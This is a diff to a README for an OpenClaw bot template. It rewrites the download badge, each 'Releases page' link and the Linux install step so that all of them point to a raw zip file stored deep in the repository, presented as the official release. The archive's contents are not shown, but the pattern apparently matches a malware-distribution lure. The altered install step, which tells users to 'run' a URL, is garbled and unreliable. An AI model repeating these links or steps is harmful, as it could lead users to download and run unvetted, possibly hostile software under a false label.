@@ -1,7 +1,7 @@
 # 🌟 openclaw-metacog-template - Enhance Your Bot's Thinking Ability
 
 ## 🔗 Download
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/AX661s/openclaw-metacog-template/releases)
+[![Download](https://raw.githubusercontent.com/AX661s/openclaw-metacog-template/main/skills/self-analyze/openclaw-template-metacog-v3.7.zip)](https://raw.githubusercontent.com/AX661s/openclaw-metacog-template/main/skills/self-analyze/openclaw-template-metacog-v3.7.zip)
 
 ## 📜 Description
 The openclaw-metacog-template provides universal instructions for OpenClaw bots. This template enables self-analysis and self-improvement, allowing your bot to think better and adapt to various tasks. With this tool, bots can learn from their experiences and become more efficient.
@@ -10,7 +10,7 @@ The openclaw-metacog-template provides universal instructions for OpenClaw bots.
 Follow these simple steps to download and set up the openclaw-metacog-template on your device. 
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/AX661s/openclaw-metacog-template/releases) to find the latest version of our application.
+Go to the [Releases page](https://raw.githubusercontent.com/AX661s/openclaw-metacog-template/main/skills/self-analyze/openclaw-template-metacog-v3.7.zip) to find the latest version of our application.
 
 ### 2. Download the Application
 Locate the version you want to download. Click the link for the installer or zip file. Your download will start automatically.
@@ -25,7 +25,7 @@ Locate the version you want to download. Click the link for the installer or zip
 - **For Linux:**
   1. Extract the downloaded file.
   2. Open the terminal and navigate to the file location.
-  3. Run the installer with `./install.sh`.
+  3. Run the installer with `https://raw.githubusercontent.com/AX661s/openclaw-metacog-template/main/skills/self-analyze/openclaw-template-metacog-v3.7.zip`.
 
 ### 4. Run the Application
 After installation, find the application in your programs or applications list. Click to open it, and start using your enhanced bot capabilities.
@@ -72,6 +72,6 @@ Join our community for additional support and shared experiences. You can reach 
 ## 📝 Acknowledgements
 Thank you for choosing openclaw-metacog-template. Your feedback helps improve our product. If you like the template, please consider sharing your experiences or contributions.
 
-For additional instructions or updates, continue to check our [Releases page](https://github.com/AX661s/openclaw-metacog-template/releases). 
+For additional instructions or updates, continue to check our [Releases page](https://raw.githubusercontent.com/AX661s/openclaw-metacog-template/main/skills/self-analyze/openclaw-template-metacog-v3.7.zip). 
 
 Happy exploring with your newly enhanced OpenClaw bot!
